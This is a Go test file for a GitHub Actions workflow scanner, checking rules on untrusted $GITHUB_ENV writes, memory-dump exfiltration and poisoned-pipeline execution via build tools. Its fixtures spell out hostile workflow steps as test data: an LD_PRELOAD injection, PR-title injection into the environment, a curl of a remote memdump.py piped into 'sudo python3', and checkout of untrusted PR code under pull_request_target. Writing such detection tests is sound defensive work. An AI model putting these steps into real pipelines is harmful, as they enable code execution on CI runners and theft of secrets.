/*
Copyright 2025 Hare Krishna Rai

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package rules

import (
	"testing"

	"github.com/harekrishnarai/flowlyt/pkg/parser"
	"gopkg.in/yaml.v3"
)

// parseWorkflowFromYAML is a test helper that parses YAML content into a WorkflowFile.
func parseWorkflowFromYAML(t *testing.T, content string) parser.WorkflowFile {
	t.Helper()
	wf := parser.WorkflowFile{
		Path:    "test.yml",
		Content: []byte(content),
	}
	if err := yaml.Unmarshal([]byte(content), &wf.Workflow); err != nil {
		t.Fatalf("failed to parse workflow YAML: %v", err)
	}
	return wf
}

// findingsWithRuleID filters findings by rule ID.
func findingsWithRuleID(findings []Finding, ruleID string) []Finding {
	var out []Finding
	for _, f := range findings {
		if f.RuleID == ruleID {
			out = append(out, f)
		}
	}
	return out
}

// ---------------------------------------------------------------------------
// EI-001: GITHUB_ENV_UNTRUSTED_WRITE
// ---------------------------------------------------------------------------

func TestEI001_GithubEnvUntrustedWrite(t *testing.T) {
	content := `
name: CI
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Set env from PR title
        run: echo "VAL=${{ github.event.pull_request.title }}" >> $GITHUB_ENV
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkGithubEnvUntrustedWrite(wf)
	matched := findingsWithRuleID(findings, "GITHUB_ENV_UNTRUSTED_WRITE")
	if len(matched) == 0 {
		t.Error("expected GITHUB_ENV_UNTRUSTED_WRITE finding for ${{ }} write to $GITHUB_ENV, got none")
	}
}

func TestEI001_LDPreloadWrite(t *testing.T) {
	content := `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Set LD_PRELOAD
        run: echo "LD_PRELOAD=/tmp/evil.so" >> $GITHUB_ENV
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkGithubEnvUntrustedWrite(wf)
	matched := findingsWithRuleID(findings, "GITHUB_ENV_UNTRUSTED_WRITE")
	if len(matched) == 0 {
		t.Error("expected GITHUB_ENV_UNTRUSTED_WRITE finding for LD_PRELOAD write to $GITHUB_ENV, got none")
	}
}

func TestEI001_SafeNormalEnvWrite(t *testing.T) {
	content := `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Set safe version env
        run: echo "VERSION=1.0.0" >> $GITHUB_ENV
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkGithubEnvUntrustedWrite(wf)
	matched := findingsWithRuleID(findings, "GITHUB_ENV_UNTRUSTED_WRITE")
	if len(matched) != 0 {
		t.Errorf("expected no GITHUB_ENV_UNTRUSTED_WRITE finding for safe env write, got %d", len(matched))
	}
}

// ---------------------------------------------------------------------------
// EI-002: MEMDUMP_EXFILTRATION_SIGNATURE
// ---------------------------------------------------------------------------

func TestEI002_MemdumpSignature(t *testing.T) {
	content := `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Dump memory
        run: |
          curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkMemdumpExfiltration(wf)
	matched := findingsWithRuleID(findings, "MEMDUMP_EXFILTRATION_SIGNATURE")
	if len(matched) == 0 {
		t.Error("expected MEMDUMP_EXFILTRATION_SIGNATURE finding for memdump.py gist, got none")
	}
}

func TestEI002_SafeStep(t *testing.T) {
	content := `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Normal step
        run: echo "hello world"
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkMemdumpExfiltration(wf)
	matched := findingsWithRuleID(findings, "MEMDUMP_EXFILTRATION_SIGNATURE")
	if len(matched) != 0 {
		t.Errorf("expected no MEMDUMP_EXFILTRATION_SIGNATURE for safe step, got %d", len(matched))
	}
}

// ---------------------------------------------------------------------------
// EI-003: INDIRECT_PPE_BUILD_TOOL
// ---------------------------------------------------------------------------

func TestEI003_IndirectPPE_npm(t *testing.T) {
	content := `
name: CI
on: [pull_request_target]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Install deps
        run: npm install
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkIndirectPPEBuildTool(wf)
	matched := findingsWithRuleID(findings, "INDIRECT_PPE_BUILD_TOOL")
	if len(matched) == 0 {
		t.Error("expected INDIRECT_PPE_BUILD_TOOL finding for npm install after untrusted checkout, got none")
	}
}

func TestEI003_SafeBaseCheckout_npm(t *testing.T) {
	content := `
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout default branch
        uses: actions/checkout@v4
      - name: Install deps
        run: npm install
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkIndirectPPEBuildTool(wf)
	matched := findingsWithRuleID(findings, "INDIRECT_PPE_BUILD_TOOL")
	if len(matched) != 0 {
		t.Errorf("expected no INDIRECT_PPE_BUILD_TOOL for base-branch checkout, got %d", len(matched))
	}
}

func TestEI003_IndirectPPE_headRef(t *testing.T) {
	content := `
name: CI
on: [pull_request_target]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - name: Build
        run: |
          make build
`
	wf := parseWorkflowFromYAML(t, content)
	findings := checkIndirectPPEBuildTool(wf)
	matched := findingsWithRuleID(findings, "INDIRECT_PPE_BUILD_TOOL")
	if len(matched) == 0 {
		t.Error("expected INDIRECT_PPE_BUILD_TOOL finding for make after head.ref checkout, got none")
	}
}
